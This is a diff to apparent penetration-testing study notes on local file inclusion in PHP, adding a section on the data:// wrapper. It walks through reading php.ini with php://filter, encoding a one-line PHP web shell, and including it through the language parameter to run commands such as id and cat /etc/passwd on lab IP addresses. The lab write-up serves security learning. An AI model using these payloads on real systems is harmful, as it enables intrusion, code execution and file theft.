@@ -200,8 +200,9 @@ http://83.136.253.59:34423/index.php?language=languages%2f%2e%2e%2e%2e%2f%2f%2e%
 ```
 
 ---
+## PHP Wrappers
 
-## PHP Stream Wrappers
+### PHP Stream Wrappers
 
 An LFI vulnerability in a PHP application may be leveraged and extended through **PHP stream wrappers**. These wrappers are normally used by developers to access I/O streams at the application level, but can be abused by attackers to read source code or, in some cases, achieve code execution when combined with other techniques.
 
@@ -248,3 +249,65 @@ echo '<string>' | base64 -d
 ![Filtered output](images/source-code.png)
 
 The `php://filter` does not provide code execution by itself, but is commonly used for information disclosure and source code analysis, which may lead to further exploitation.
+
+### PHP Data Wrapper
+
+The **data wrapper** (`data://`) can be abused to achieve remote code execution (RCE) by including external data, such as PHP code. 
+
+The data wrapper can only be utilized when `allow_url_include = On` is set in the PHP configuration file. PHP configuration files are usually found at (X.Y is substituted for the PHP version):
+
+- `/etc/php/X.Y/apache2/php.ini` (Apache server)
+- `/etc/php/X.Y/fpm/php.ini`     (Nginx server)
+
+Configuration files may be read through an LFI vulnerability along with the `php://filter` wrapper and `convert.base64-encode`.
+
+**Example:**
+
+```bash
+# Base64 encode PHP configuration file via LFI
+http://94.237.55.43:35886/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+```
+
+Decode the returned base64 string:
+
+```bash
+# Decode base64 string
+echo '<string>' | base64 -d
+```
+
+![Filtered output](images/allow-url-include.png)
+
+The data wrapper can include base64-encoded PHP code that will be decoded and executed by the server.
+
+**Step 1:**
+
+```bash
+# Base64 encode a PHP web shell
+echo '<?php system($_GET["cmd"]); ?>' | base64
+```
+
+```bash
+# Base64 encoded web shell
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+
+**Step 2:**
+```bash
+# URL encode the base64 string
+%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%52%66%52%30%56%55%57%79%4a%6a%62%57%51%69%58%53%6b%37%49%44%38%2b%43%67%3d%3d
+```
+
+**Step 3:**
+```bash
+# Include the encoded shell via the data wrapper:
+http://94.237.55.43:35886/index.php?language=data://text/plain;base64,%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%52%66%52%30%56%55%57%79%4a%6a%62%57%51%69%58%53%6b%37%49%44%38%2b%43%67%3d%3d
+```
+
+**Step 4:**
+
+```bash
+# Pass commands via the cmd GET parameter:
+http://94.237.55.43:35886/index.php?language=data://text/plain;base64,%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%52%66%52%30%56%55%57%79%4a%6a%62%57%51%69%58%53%6b%37%49%44%38%2b%43%67%3d%3d&cmd=id
+
+http://94.237.55.43:35886/index.php?language=data://text/plain;base64,%50%44%39%77%61%48%41%67%63%33%6c%7a%64%47%56%74%4b%43%52%66%52%30%56%55%57%79%4a%6a%62%57%51%69%58%53%6b%37%49%44%38%2b%43%67%3d%3d&cmd=cd+../../../;cat+/etc/passwd
+```
